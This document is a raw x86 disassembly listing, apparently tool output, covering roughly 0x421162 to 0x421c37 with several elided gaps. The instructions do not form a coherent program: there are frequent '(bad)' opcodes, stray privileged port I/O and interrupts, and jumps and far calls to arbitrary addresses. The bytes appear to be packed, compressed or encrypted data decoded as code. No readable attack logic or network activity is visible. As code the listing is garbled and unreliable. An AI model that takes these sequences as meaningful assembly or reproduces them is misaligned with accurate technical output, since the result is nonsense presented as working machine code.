  421162:	sub    BYTE PTR [edi],0xcb
  421165:	pop    ds
  421166:	push   ebx
  421167:	enter  0x8e24,0xde
  42116b:	es jle 0x421151
  42116e:	dec    edx
  42116f:	xchg   ebx,eax
  421170:	inc    esi
  421171:	adc    eax,0xc171630d
  421176:	shl    DWORD PTR [esi-0x26],0x5e
  42117a:	push   cs
  42117b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42117c:	jns    0x42111c
  42117e:	mov    al,ds:0x1b865d1a
  421183:	add    BYTE PTR [ecx+0x36],dh
  421186:	push   ss
  421187:	pop    ss
  421188:	xchg   ebx,eax
  421189:	sets   BYTE PTR [ecx+0x68]
  42118d:	jb     0x42113d
  42118f:	ficomp DWORD PTR [ebx]
  421191:	push   es
  421192:	push   0xffffffe6
  421194:	inc    esi
  421195:	push   0xef8874b0
  42119a:	gs mov edi,0xb0476c8a
  4211a0:	sbb    eax,0xa65f4bfc
  4211a5:	sbb    al,0x72
  4211a7:	xchg   BYTE PTR [ecx+0x68],ah
  4211aa:	xchg   edi,eax
  4211ab:	(bad)  
  4211ac:	loope  0x4211e1
  4211ae:	scas   al,BYTE PTR es:[edi]
  4211af:	mov    al,ds:0xe98833cc
  4211b4:	ins    DWORD PTR es:[edi],dx
  4211b5:	jecxz  0x4211eb
  4211b7:	cmp    eax,0xa73cabb8
  4211bc:	xchg   esi,eax
  4211bd:	es (bad) 
  4211bf:	sahf   
  4211c0:	or     ch,bl
  4211c2:	in     eax,dx
  4211c3:	inc    esp
  4211c4:	xchg   ecx,eax
  4211c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211c6:	push   cs
  4211c7:	jg     0x421165
  4211c9:	xchg   edx,ebx
  4211cb:	retf   
  4211cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211cd:	mov    bh,0x9b
  4211cf:	add    BYTE PTR [esi+0x5e],0x14
  4211d3:	sbb    eax,0xadcd4629
  4211d8:	sbb    DWORD PTR [ecx],ebp
  4211da:	cmp    BYTE PTR [esi-0x66],bh
  4211dd:	mov    WORD PTR [ebx+0x44],?
  4211e0:	push   esp
  4211e1:	pushf  
  4211e2:	fst    DWORD PTR [edx+ecx*8-0x26]
  4211e6:	dec    esp
  4211e7:	push   eax
  4211e8:	pop    es
  4211e9:	adc    ah,BYTE PTR [edi-0x692d04d3]
  4211ef:	sub    dl,BYTE PTR [esp+edx*2+0x75]
  4211f3:	retf   0x9f46
  4211f6:	sbb    ebp,DWORD PTR [ecx-0x1e45b569]
  4211fc:	xor    bh,BYTE PTR [ebx]
  4211fe:	gs or  eax,0xb928de5a
  421204:	outs   dx,DWORD PTR ds:[esi]
  421205:	cld    
  421206:	jmp    0x189802ba
  42120b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42120c:	inc    eax
  42120d:	cmp    DWORD PTR [ebx],ebx
  42120f:	ins    DWORD PTR es:[edi],dx
  421210:	or     ebp,esp
  421212:	(bad)  
  421213:	in     eax,dx
  421214:	stos   BYTE PTR es:[edi],al
  421215:	pop    eax
  421216:	jbe    0x42119d
  421218:	out    0x42,al
  42121a:	mov    ebx,0xea26d2c9
  42121f:	or     eax,0x3208e5ae
  421224:	call   0x3ec860d0
  421229:	cmp    al,0x30
  42122b:	jbe    0x421247
  42122d:	pop    esi
  42122e:	or     cl,dl
  421230:	or     BYTE PTR [esi+0x22d0bb8f],cl
  421236:	xchg   esp,eax
  421237:	inc    ebp
  421238:	cli    
  421239:	out    0x32,al
  42123b:	jo     0x4211c6
  42123d:	xor    al,0x6a
  42123f:	add    al,0x47
  421241:	cmp    al,BYTE PTR [eax]
	...
  4212b3:	add    BYTE PTR [ecx+0x6],al
  4212b6:	clc    
  4212b7:	mov    esi,0xff47feff
  4212bc:	or     eax,0x9283dc15
  4212c1:	loop   0x42131a
  4212c3:	add    al,0x6e
  4212c5:	arpl   WORD PTR [ecx],ax
  4212c7:	add    dh,dh
  4212c9:	add    BYTE PTR [eax],al
  4212cb:	add    BYTE PTR [ebp+0xa],ch
  4212ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212cf:	imul   ebp,DWORD PTR [eax+0x7a],0xc52406b7
  4212d6:	aad    0xed
  4212d8:	sbb    al,0x8a
  4212da:	lods   al,BYTE PTR ds:[esi]
  4212db:	mov    bl,BYTE PTR [edi-0x756ad12e]
  4212e1:	add    dh,dl
  4212e3:	int    0x58
  4212e5:	mov    es,WORD PTR [edx+0x6e9dcc8b]
  4212eb:	stos   DWORD PTR es:[edi],eax
  4212ec:	in     eax,0x71
  4212ee:	out    dx,al
  4212ef:	aas    
  4212f0:	jno    0x421352
  4212f2:	push   es
  4212f3:	clc    
  4212f4:	push   eax
  4212f5:	test   al,0x8f
  4212f7:	mov    dh,0x4b
  4212f9:	loop   0x42130e
  4212fb:	dec    ebx
  4212fc:	das    
  4212fd:	adc    BYTE PTR [eax],0x2
  421300:	into   
  421301:	clc    
  421302:	out    0x8b,eax
  421304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421305:	adc    eax,0x943f6597
  42130a:	or     bh,BYTE PTR [ecx+edi*2-0x37641348]
  421311:	les    ebp,FWORD PTR [ebp+0x74ae9880]
  421317:	and    ecx,esi
  421319:	add    ch,bl
  42131b:	test   eax,0x183f2092
  421320:	and    BYTE PTR [esi+0x6a5a9120],bh
  421326:	or     ch,BYTE PTR [ecx]
  421328:	adc    dl,BYTE PTR [ebp-0x45e51fd7]
  42132e:	mov    DWORD PTR [esi+0x26],ebp
  421331:	ds das 
  421333:	into   
  421334:	mov    eax,ds:0x264cae68
  421339:	cmp    dl,BYTE PTR [edx]
  42133b:	pop    edi
  42133c:	clc    
  42133d:	cmp    ebx,ecx
  42133f:	push   eax
  421340:	rcr    BYTE PTR [edx+0x6fad399e],0x56
  421347:	pop    ds
  421348:	fisub  DWORD PTR [eax+0x5f]
  42134b:	scas   al,BYTE PTR es:[edi]
  42134c:	popf   
  42134d:	dec    esi
  42134f:	(bad)  
  421350:	jo     0x42136a
  421352:	ins    BYTE PTR es:[edi],dx
  421353:	adc    bl,0xdd
  421356:	clc    
  421357:	scas   al,BYTE PTR es:[edi]
  421358:	xor    bl,BYTE PTR [ebx-0x434c0c21]
  42135e:	cmp    DWORD PTR [edx+0x63],eax
  421361:	push   esp
  421362:	(bad)  
  421363:	and    al,bh
  421365:	sub    ebp,DWORD PTR ds:0xc8c27c74
  42136b:	shl    BYTE PTR ds:0x4eb044f,1
  421371:	shr    BYTE PTR [edi],0x79
  421374:	test   esi,esi
  421376:	(bad)  
  421377:	std    
  421378:	idiv   DWORD PTR [ecx]
  42137a:	pop    edi
  42137b:	mov    al,ds:0x1714a873
  421380:	or     bl,BYTE PTR ds:[esi-0x3e]
  421384:	and    DWORD PTR [ebx],edx
  421386:	and    esi,DWORD PTR [edx+ecx*1-0x7527b56]
  42138d:	adc    eax,0xcfc4349d
  421392:	pop    ecx
  421393:	and    DWORD PTR [edx],ecx
  421395:	cmp    ecx,DWORD PTR cs:[ebp-0x2331249]
  42139c:	shl    DWORD PTR [esi],0x6e
  42139f:	push   ecx
  4213a0:	push   0xdd3e6a47
  4213a5:	rcl    esp,1
  4213a7:	dec    esi
  4213a8:	mov    ecx,0xf66a31a4
  4213ad:	xchg   esi,eax
  4213ae:	pushf  
  4213af:	dec    ecx
  4213b0:	jno    0x421372
  4213b2:	mov    WORD PTR [edx-0x2],es
  4213b5:	retf   0x4310
  4213b8:	loope  0x42134d
  4213ba:	pop    esi
  4213bb:	pop    es
  4213bc:	push   edx
  4213bd:	mov    BYTE PTR [edi-0x10],cl
  4213c0:	test   eax,0x35
	...
  421431:	add    BYTE PTR [eax],al
  421433:	add    BYTE PTR [esi+0x7f125794],ch
  421439:	shr    edi,cl
  42143b:	mov    esp,0x960320e2
  421440:	fist   WORD PTR [ecx-0x26]
  421443:	out    0x64,al
  421445:	add    DWORD PTR fs:[eax],eax
  421448:	test   BYTE PTR [eax],0x0
  42144b:	add    BYTE PTR [edx+0x14fe90fe],cl
  421451:	cmp    eax,ebx
  421453:	pop    ebp
  421454:	ins    DWORD PTR es:[edi],dx
  421455:	fwait
  421456:	sbb    DWORD PTR [ebx-0x5ce6afd0],eax
  42145c:	stos   BYTE PTR es:[edi],al
  42145d:	loope  0x42141d
  42145f:	mov    al,ds:0x5ea82d62
  421464:	fst    DWORD PTR [esi+0x4e]
  421467:	ss out dx,al
  421469:	ss pop ss
  42146b:	pop    ebp
  42146c:	outs   dx,DWORD PTR ds:[esi]
  42146d:	pushw  0x2be2
  421471:	mov    ebp,0x39952258
  421476:	and    DWORD PTR ds:0x124d21ed,edx
  42147c:	test   al,0x5c
  42147e:	sar    esp,1
  421480:	sti    
  421481:	mov    ah,0x6d
  421483:	xchg   BYTE PTR [ecx+ecx*2+0x62],dl
  421487:	xlat   BYTE PTR ds:[ebx]
  421488:	(bad)  [ebx]
  42148a:	mov    cl,0x90
  42148c:	pop    edx
  42148d:	jge    0x421446
  42148f:	xor    DWORD PTR [edx+0x4942f8d1],ebx
  421495:	jecxz  0x4214ab
  421497:	cmp    ebp,DWORD PTR [eax]
  421499:	in     al,0xe8
  42149b:	mov    bl,0x16
  42149d:	popf   
  42149e:	inc    ebp
  42149f:	mov    ds:0x8d5d3bd1,eax
  4214a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214a5:	enter  0x95cf,0x26
  4214a9:	or     al,0xb5
  4214ab:	xor    DWORD PTR [edi-0x56f1d22d],edi
  4214b1:	fwait
  4214b2:	xor    ecx,DWORD PTR [edx+0x5393076b]
  4214b8:	mov    eax,0x5ba9601c
  4214bd:	loopne 0x4214bc
  4214bf:	outs   dx,DWORD PTR ds:[esi]
  4214c0:	mov    WORD PTR ds:0xb52f650a,fs
  4214c6:	sub    eax,0x44afdf1e
  4214cb:	aaa    
  4214cc:	pop    es
  4214cd:	and    eax,0x95309ebd
  4214d2:	add    eax,0x606e3962
  4214d7:	retf   0x6c7b
  4214da:	adc    DWORD PTR [ebx+0x72],esi
  4214dd:	dec    edx
  4214de:	xor    eax,0xa4db8f6e
  4214e3:	add    DWORD PTR [ebp-0x20],edx
  4214e6:	jne    0x4214d1
  4214e8:	scas   eax,DWORD PTR es:[edi]
  4214e9:	sbb    bh,BYTE PTR [eax+0x3e744c14]
  4214ef:	inc    edi
  4214f0:	push   cs
  4214f1:	adc    DWORD PTR [ebp+0x1d],0x2d
  4214f5:	in     eax,dx
  4214f6:	jno    0x421557
  4214f8:	iret   
  4214f9:	jl     0x421525
  4214fb:	scas   al,BYTE PTR es:[edi]
  4214fc:	cmp    eax,0xed8af46e
  421501:	retf   
  421502:	stos   DWORD PTR es:[edi],eax
  421503:	pop    eax
  421504:	lods   al,BYTE PTR ds:[esi]
  421505:	pop    eax
  421506:	sahf   
  421507:	pop    ebp
  421508:	push   edi
  421509:	int3   
  42150a:	lea    ecx,[ebp+ecx*1+0x2a]
  42150e:	sub    DWORD PTR [ecx-0x36],esp
  421511:	adc    al,BYTE PTR [ebp+0x79893d6b]
  421517:	(bad)  
  421518:	pop    ecx
  421519:	es sub cl,dl
  42151c:	popf   
  42151d:	xor    al,0x83
  42151f:	inc    eax
  421520:	jge    0x421583
  421522:	fdiv   DWORD PTR [ecx+0x54]
  421525:	lea    ebp,[ecx]
  421527:	xchg   esi,eax
  421528:	lods   al,BYTE PTR ds:[esi]
  421529:	pop    ebp
  42152a:	add    DWORD PTR [eax+0x6117baac],esp
  421530:	sub    al,0xeb
  421532:	imul   edx,DWORD PTR [edx+0x20b4e2d4],0xffffffee
  421539:	scas   eax,DWORD PTR es:[edi]
  42153a:	xlat   BYTE PTR ds:[ebx]
  42153b:	loope  0x4214d7
  42153d:	es repz pop edi
  421540:	or     ch,ah
	...
  4215b2:	add    BYTE PTR [eax],al
  4215b4:	test   BYTE PTR [eax-0x48],ch
  4215b7:	or     ah,bh
  4215b9:	fdiv   DWORD PTR [esp+ebp*8-0x55f32d34]
  4215c0:	ret    0x1178
  4215c3:	mov    cl,0x5a
  4215c5:	add    DWORD PTR gs:[eax],eax
  4215c8:	test   BYTE PTR [eax],0x0
  4215cb:	add    ch,bh
  4215cd:	xchg   ebx,eax
  4215ce:	lea    edi,ds:0x8f7670a9
  4215d4:	push   eax
  4215d5:	push   esp
  4215d6:	mov    cl,0xcc
  4215d8:	or     eax,0x35e46efb
  4215dd:	pop    es
  4215de:	pop    ss
  4215df:	adc    BYTE PTR [edx-0x1192b42d],bh
  4215e5:	je     0x421595
  4215e7:	fisub  WORD PTR [edx+ecx*8]
  4215ea:	(bad)  
  4215eb:	aad    0xd1
  4215ed:	jne    0x4215a0
  4215ef:	dec    ebp
  4215f0:	sub    bh,ch
  4215f2:	scas   al,BYTE PTR es:[edi]
  4215f3:	rcl    DWORD PTR [eax-0x2a],1
  4215f6:	jle    0x421667
  4215f8:	js     0x4215f6
  4215fa:	outs   dx,DWORD PTR ds:[esi]
  4215fb:	sbb    DWORD PTR [edx],ebp
  4215fd:	fisttp QWORD PTR [esi-0x5d51da]
  421603:	mov    BYTE PTR [ecx-0x2a96001a],bh
  421609:	imul   edx,DWORD PTR [edx-0x670cfd76],0xffffff87
  421610:	pop    es
  421611:	(bad)  
  421612:	rcr    BYTE PTR [ebp+0x27],1
  421615:	mov    cl,0xe8
  421617:	dec    ebp
  421618:	jg     0x4215c7
  42161a:	fiadd  WORD PTR [edi-0x1c12ec4]
  421620:	xchg   DWORD PTR [eax],ebx
  421622:	repz inc esp
  421624:	das    
  421625:	aas    
  421626:	inc    edi
  421627:	xchg   ecx,eax
  421628:	popa   
  421629:	add    al,0x5a
  42162b:	fs and al,0xda
  42162e:	jle    0x421649
  421630:	in     eax,0x44
  421632:	or     eax,DWORD PTR [ecx+ecx*2+0x4e]
  421636:	and    al,0x95
  421638:	dec    ecx
  421639:	sbb    al,0xc5
  42163b:	repz fadd st,st(7)
  42163e:	dec    edi
  42163f:	pop    ebp
  421640:	lds    ebx,FWORD PTR [esi-0x3e]
  421643:	sbb    esi,DWORD PTR [edi]
  421645:	mov    eax,0x832fd463
  42164a:	dec    eax
  42164b:	inc    eax
  42164c:	jmp    0x4216b8
  42164e:	sub    al,0x87
  421650:	cmc    
  421651:	mov    ah,0xb6
  421653:	cwde   
  421654:	loope  0x421661
  421656:	xor    eax,0x20f55432
  42165b:	std    
  42165c:	inc    eax
  42165d:	dec    esi
  42165e:	and    DWORD PTR [ebp+edi*4-0x64],eax
  421662:	adc    eax,0x7b312e26
  421667:	and    eax,0xd9e8d16c
  42166c:	and    eax,0xefd2a5db
  421671:	cmp    eax,0xd930e8e6
  421676:	or     BYTE PTR [ebp+ebp*1+0x11],dh
  42167a:	data16 sbb al,dl
  42167d:	mov    esi,0xa2d6bd1c
  421682:	sbb    al,0xb0
  421684:	jmp    0x42164d
  421686:	mov    ch,bh
  421688:	ins    DWORD PTR es:[edi],dx
  421689:	shl    BYTE PTR [edi+0x25a70ba],0x14
  421690:	nop
  421691:	lods   eax,DWORD PTR ds:[esi]
  421692:	test   eax,0x4a31969
  421697:	inc    edx
  421698:	or     al,BYTE PTR [eax+0x5be945d4]
  42169e:	jb     0x4216f1
  4216a0:	push   edx
  4216a1:	mov    ebp,0xb749395
  4216a6:	fsubp  st(1),st
  4216a8:	call   0xd05f:0x7ab0526a
  4216af:	mov    ebx,0x913a2e0d
  4216b4:	or     eax,0x780c8788
  4216b9:	xlat   BYTE PTR ds:[ebx]
  4216ba:	push   0xffffff8c
  4216bc:	inc    ebx
  4216bd:	and    eax,0xdce57a4e
	...
  421732:	add    BYTE PTR [eax],al
  421734:	mov    DWORD PTR [edi],ebp
  421736:	and    eax,0xad8aa780
  42173b:	das    
  42173c:	retf   0x8184
  42173f:	cmp    eax,DWORD PTR [ebp-0x3]
  421742:	jne    0x421749
  421744:	push   eax
  421745:	add    WORD PTR [eax],ax
  421748:	test   BYTE PTR [eax],0x0
  42174b:	add    BYTE PTR [ebx+0x3f],ah
  42174e:	fcmovu st,st(7)
  421750:	mov    es,WORD PTR [edx+esi*4]
  421753:	ins    DWORD PTR es:[edi],dx
  421754:	hlt    
  421755:	sti    
  421756:	repz data16 jle 0x421730
  42175a:	imul   edx,DWORD PTR [ebp-0x2368f92f],0x21
  421761:	mov    eax,0xcd007318
  421766:	repz cmp DWORD PTR [ebp+ebp*4+0x692c1dc1],0x58bb6c4
  421772:	xchg   DWORD PTR [ebp+0x4feac8ad],esp
  421778:	(bad)  
  42177a:	cmp    ebp,esp
  42177c:	es sub esi,ebx
  42177f:	pop    esp
  421780:	sub    cl,BYTE PTR [ecx]
  421782:	aam    0x56
  421784:	lock mov dh,0x86
  421787:	adc    al,0x30
  421789:	adc    BYTE PTR [esi+ebp*1-0x13],bh
  42178d:	jbe    0x42175d
  42178f:	sbb    DWORD PTR [ebx-0x16],ecx
  421792:	jnp    0x42171f
  421794:	retf   
  421795:	shr    DWORD PTR [ebp+0x41],1
  421798:	ds jg  0x421737
  42179b:	mov    ecx,0x1cb327f2
  4217a0:	int    0x9f
  4217a2:	jno    0x421788
  4217a4:	adc    BYTE PTR [edx],bl
  4217a6:	jge    0x421748
  4217a8:	pushf  
  4217a9:	mov    esp,0x28200ab3
  4217ae:	or     BYTE PTR ds:0x3a6b6a6e,ch
  4217b4:	mov    bl,0x28
  4217b6:	push   ss
  4217b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217b8:	mov    ds:0x4bfc7d1e,eax
  4217bd:	es pop edi
  4217bf:	daa    
  4217c0:	jle    0x4217d2
  4217c2:	add    DWORD PTR [eax+0x65],ebp
  4217c5:	jge    0x42175a
  4217c7:	fsub   QWORD PTR [ebp+ebx*1+0x1b101ed3]
  4217ce:	cmp    DWORD PTR [eax-0x9],0xffffffc0
  4217d2:	sub    DWORD PTR [edx-0x591be3bf],edi
  4217d8:	imul   edi,DWORD PTR [ebx-0x60],0xc98618b4
  4217df:	dec    esp
  4217e0:	js     0x421851
  4217e2:	ss cwde 
  4217e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217e5:	push   edx
  4217e6:	add    al,0x38
  4217e8:	or     edx,DWORD PTR [eax+0x4f5f984e]
  4217ee:	inc    ebp
  4217ef:	and    cl,BYTE PTR [edi+0x776aecac]
  4217f5:	(bad)  
  4217f6:	or     BYTE PTR [edi-0xb],bl
  4217f9:	push   eax
  4217fa:	xchg   esi,eax
  4217fb:	dec    esp
  4217fc:	loop   0x4217eb
  4217fe:	les    ebx,FWORD PTR [ebx]
  421800:	pushf  
  421801:	add    eax,0x4c1ee389
  421806:	mov    ebx,0x499af2ee
  42180b:	mov    ax,0x8a94
  42180f:	clc    
  421810:	xchg   ecx,eax
  421811:	lahf   
  421812:	sub    eax,0x719fb4
  421817:	inc    ebx
  421819:	pop    ebp
  42181a:	fild   DWORD PTR [eax+ecx*2]
  42181d:	ror    BYTE PTR [esi-0x3],1
  421820:	jmp    0xaec2:0x1837391b
  421827:	inc    ebx
  421828:	dec    ebx
  421829:	mov    dl,0xba
  42182b:	sar    esi,0x14
  42182e:	lds    esi,FWORD PTR [esi]
  421830:	(bad)  
  421831:	pusha  
  421832:	repz inc ecx
  421834:	dec    ecx
  421835:	ja     0x4217f0
  421837:	pushf  
  421838:	out    0xcd,eax
  42183a:	jl     0x421876
  42183c:	adc    DWORD PTR [ebp-0x6d],eax
  42183f:	loop   0x42189c
  421841:	jb     0x421843
	...
  4218b3:	add    ah,bl
  4218b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218b6:	jae    0x421905
  4218b8:	jnp    0x421899
  4218ba:	(bad)  
  4218bb:	mov    ch,0x82
  4218bd:	lods   eax,DWORD PTR ds:[esi]
  4218be:	push   ds
  4218bf:	adc    ecx,DWORD PTR [ecx+0x46141417]
  4218c5:	add    DWORD PTR [bx+si],eax
  4218c8:	test   BYTE PTR [eax],0x0
  4218cb:	add    BYTE PTR [ebx+0x48de4754],ah
  4218d1:	mov    ecx,0x6096be21
  4218d6:	lds    eax,FWORD PTR [edx+0x35]
  4218d9:	aam    0xb3
  4218db:	inc    ecx
  4218dc:	and    bl,BYTE PTR [eax+0x2f]
  4218df:	inc    ebx
  4218e0:	inc    ebx
  4218e1:	mov    edx,0x2e0f9d88
  4218e6:	adc    al,0xf3
  4218e8:	mov    bl,0x3f
  4218ea:	mov    eax,gs
  4218ec:	inc    esp
  4218ed:	idiv   DWORD PTR [eax+0x5e]
  4218f0:	retf   0xb42
  4218f3:	inc    edi
  4218f4:	les    ebx,FWORD PTR [ebp+0x74792f81]
  4218fa:	adc    DWORD PTR [edx],edi
  4218fc:	push   cs
  4218fd:	lahf   
  4218fe:	(bad)  
  4218ff:	adc    ebp,esi
  421901:	pop    edx
  421902:	dec    esp
  421903:	gs dec esi
  421905:	sub    eax,0x3c41bccc
  42190a:	inc    esi
  42190b:	cs jle 0x421978
  42190e:	(bad)  
  42190f:	jno    0x42191a
  421911:	scas   al,BYTE PTR es:[edi]
  421912:	(bad)  
  421913:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421914:	call   0xc0c6:0x9c9a79c0
  42191b:	lahf   
  42191c:	inc    edi
  42191d:	mov    edi,0x157c6fb7
  421922:	mov    ds:0xfa49012e,eax
  421927:	mov    ds,WORD PTR [edx]
  421929:	scas   al,BYTE PTR es:[edi]
  42192a:	sbb    eax,0xd0823ea2
  42192f:	loope  0x4218bd
  421931:	repnz leave 
  421933:	or     DWORD PTR [ebx+edi*1+0x34],0xffffffa1
  421938:	out    0x40,al
  42193a:	outs   dx,DWORD PTR ds:[esi]
  42193b:	mov    WORD PTR [esi],ss
  42193d:	psrlq  mm7,QWORD PTR [ebp+0x64]
  421941:	aaa    
  421942:	jecxz  0x4218cb
  421944:	sti    
  421945:	mov    ecx,0x3f0010c
  42194a:	stos   BYTE PTR es:[edi],al
  42194b:	sbb    eax,0xae5d44a6
  421950:	scas   eax,DWORD PTR es:[edi]
  421951:	and    DWORD PTR [edi+eax*1+0x2ee9a0b3],0xffffff9d
  421959:	push   cs
  42195a:	jae    0x42191c
  42195c:	retf   
  42195d:	repz xchg esp,eax
  42195f:	jge    0x421954
  421961:	out    dx,al
  421962:	mov    edx,0x6037a441
  421967:	pop    ecx
  421968:	mov    WORD PTR [bp+di-0x1f],fs
  42196c:	sub    eax,0x1ac6a3fb
  421971:	xor    al,0x78
  421973:	jbe    0x421942
  421975:	xchg   edi,eax
  421976:	pop    edx
  421977:	into   
  421978:	cmp    BYTE PTR [ebx+esi*8],0xb2
  42197c:	jnp    0x42191d
  42197e:	or     eax,edi
  421980:	jmp    0x534025dd
  421985:	rcl    DWORD PTR [ebx+0x47],cl
  421988:	pop    ebx
  421989:	push   ds
  42198a:	sbb    al,0xad
  42198c:	mov    BYTE PTR [edx+0x338620f2],bl
  421992:	or     cl,BYTE PTR [ecx+ecx*8]
  421995:	mov    BYTE PTR [ebx-0x6fd95956],bh
  42199b:	jbe    0x421968
  42199d:	cmp    edi,edx
  42199f:	push   0x3f0d113d
  4219a4:	out    0xe9,eax
  4219a6:	or     BYTE PTR ds:0xbffaba9,bh
  4219ac:	push   0x13c31f75
  4219b1:	cmp    al,0x33
  4219b3:	test   eax,0x6f9c4014
  4219b8:	aaa    
  4219b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219ba:	nop
  4219bb:	mov    bp,0x5f0e
  4219bf:	retf   0xac2b
	...
  421a32:	add    BYTE PTR [eax],al
  421a34:	fbstp  TBYTE PTR [edx]
  421a36:	scas   eax,DWORD PTR es:[edi]
  421a37:	adc    ebp,edi
  421a39:	lahf   
  421a3a:	(bad)  
  421a3b:	(bad)  
  421a3c:	mov    al,0x37
  421a3e:	and    edx,DWORD PTR [edx-0x111454cd]
  421a44:	cmp    al,0x68
  421a46:	add    DWORD PTR [eax],eax
  421a48:	test   BYTE PTR [eax],0x0
  421a4b:	add    cl,bl
  421a4d:	jne    0x4219eb
  421a4f:	mov    ebp,0x920139e9
  421a54:	icebp  
  421a55:	inc    esp
  421a56:	xchg   ecx,eax
  421a57:	inc    ecx
  421a58:	cmp    BYTE PTR [ebx-0x41],0xd1
  421a5c:	rcl    BYTE PTR [edi+0x296d3fd7],1
  421a62:	jle    0x4219fb
  421a64:	(bad)  
  421a65:	jmp    0x8c9e:0x389552f6
  421a6c:	push   0xffffffe9
  421a6e:	call   0x4640:0xc9bc923d
  421a75:	inc    edx
  421a76:	sbb    BYTE PTR [eax],al
  421a78:	push   eax
  421a79:	xor    DWORD PTR [ebx+0x127059a8],eax
  421a7f:	push   edx
  421a80:	in     eax,dx
  421a81:	addr16 nop
  421a83:	(bad)  
  421a84:	mov    al,0xa1
  421a86:	mov    ebp,0x86bbb244
  421a8b:	fnstenv ds:[ebx+0x32]
  421a8f:	jbe    0x421b00
  421a91:	nop
  421a92:	test   BYTE PTR [esp+ecx*8+0x35750754],0x2b
  421a9a:	xor    BYTE PTR fs:[edx],bh
  421a9d:	es inc esi
  421a9f:	popf   
  421aa0:	jno    0x421ab3
  421aa2:	inc    ecx
  421aa3:	out    dx,al
  421aa4:	arpl   WORD PTR [esi+0x50f33570],cx
  421aaa:	aas    
  421aab:	stc    
  421aac:	jl     0x421ae2
  421aae:	ret    
  421aaf:	mov    esi,0x84d3f52f
  421ab4:	iret   
  421ab5:	fstp   DWORD PTR es:[ebp-0x73]
  421ab9:	sub    ebx,esi
  421abb:	aas    
  421abc:	pop    esp
  421abd:	es push es
  421abf:	pop    ds
  421ac0:	pop    ebx
  421ac1:	mov    dl,BYTE PTR [eax-0x46]
  421ac4:	(bad)
  421ac9:	lods   al,BYTE PTR ds:[esi]
  421aca:	mov    bl,ch
  421acc:	jne    0x421aca
  421ace:	scas   eax,DWORD PTR es:[edi]
  421acf:	sub    cl,BYTE PTR fs:[ecx+0x542b4c7f]
  421ad6:	mov    DWORD PTR [ecx-0x3f],eax
  421ad9:	or     ah,dh
  421adb:	jno    0x421a74
  421add:	mov    ds:0x5a0c6894,eax
  421ae2:	sub    eax,0x93e91a18
  421ae7:	push   ebp
  421ae8:	(bad)  
  421ae9:	neg    ah
  421aeb:	xchg   edx,eax
  421aec:	jb     0x421b4c
  421aee:	mov    eax,ds:0x94c50cfb
  421af3:	cwde   
  421af4:	rcl    edi,1
  421af6:	(bad)  
  421af7:	arpl   WORD PTR [ecx],ax
  421af9:	les    eax,FWORD PTR [eax-0x1d9e390e]
  421aff:	xor    BYTE PTR [ebx],dl
  421b01:	stos   BYTE PTR es:[edi],al
  421b02:	(bad)  
  421b03:	imul   ebp,DWORD PTR [esi-0xa00aa41],0xffffffec
  421b0a:	or     eax,0xd685f38d
  421b0f:	jg     0x421abf
  421b11:	add    bl,ah
  421b13:	fst    QWORD PTR [ebx+0x142960d0]
  421b19:	fbstp  TBYTE PTR [eax+0x7c]
  421b1c:	dec    esi
  421b1d:	inc    ebx
  421b1e:	sar    DWORD PTR [ebp-0x58134e04],1
  421b24:	push   esi
  421b25:	or     al,BYTE PTR [edx-0x6a]
  421b28:	dec    ecx
  421b29:	mov    bh,al
  421b2b:	lods   eax,DWORD PTR ds:[esi]
  421b2c:	add    dh,BYTE PTR [ebp-0x3e]
  421b2f:	shr    edx,1
  421b31:	push   0xffffffc6
  421b33:	mov    ?,WORD PTR [esi-0xc]
  421b36:	mov    dl,0x73
  421b38:	xchg   esi,eax
  421b3a:	test   BYTE PTR [ecx],dh
  421b3c:	xchg   ebx,eax
  421b3d:	aam    0x16
  421b3f:	fist   DWORD PTR [ecx+0x60]
	...
  421bb2:	add    BYTE PTR [eax],al
  421bb4:	mov    dl,BYTE PTR ds:0xbf9fb10b
  421bba:	mov    edx,0xae2d6a3f
  421bbf:	sub    ebp,DWORD PTR [edx-0x25]
  421bc2:	sbb    DWORD PTR [edx+0x16932],esi
  421bc8:	test   BYTE PTR [eax],0x0
  421bcb:	add    BYTE PTR [ecx+eax*8+0x339d6d11],al
  421bd2:	dec    esi
  421bd3:	cmp    bl,BYTE PTR ds:0xa27e9a93
  421bd9:	and    eax,0x2e1c02f0
  421bde:	sub    ebx,DWORD PTR [esi+0x7dedc48f]
  421be4:	adc    al,0xdb
  421be6:	lods   eax,DWORD PTR ds:[esi]
  421be7:	lea    eax,[edx]
  421be9:	out    dx,al
  421bea:	test   eax,0x9e858c56
  421bef:	or     BYTE PTR [ebp+0x4e],bh
  421bf2:	xor    BYTE PTR [edi-0x13],ch
  421bf5:	xor    DWORD PTR [ebp-0x51],ebx
  421bf8:	inc    edx
  421bf9:	xchg   esp,eax
  421bfa:	js     0x421c36
  421bfc:	adc    BYTE PTR [ebx],bh
  421bfe:	fcmovbe st,st(0)
  421c00:	and    cl,BYTE PTR [ebp-0x4f]
  421c03:	lods   eax,DWORD PTR ds:[esi]
  421c04:	fs xchg esp,eax
  421c06:	lods   eax,DWORD PTR ds:[esi]
  421c07:	loope  0x421c18
  421c09:	mov    ds:0xbf8c25bd,eax
  421c0e:	cmp    eax,DWORD PTR [edx]
  421c10:	rcr    DWORD PTR [ebx+0x74],cl
  421c13:	fsubp  st(1),st
  421c15:	idiv   BYTE PTR ds:0x563fe444
  421c1b:	mov    eax,ds:0x790aaddf
  421c20:	ror    BYTE PTR [eax+0x2e],0x67
  421c24:	in     al,dx
  421c25:	add    esi,ebx
  421c27:	mov    ah,0x8c
  421c29:	scas   eax,DWORD PTR es:[edi]
  421c2a:	inc    ebp
  421c2b:	cdq    
  421c2c:	xchg   edi,eax
  421c2d:	fistp  DWORD PTR [edi+eiz*8]
  421c30:	adc    eax,0xa277f1a0
  421c35:	and    DWORD PTR [ecx],ebx
  421c37:	jecxz  0x421c30
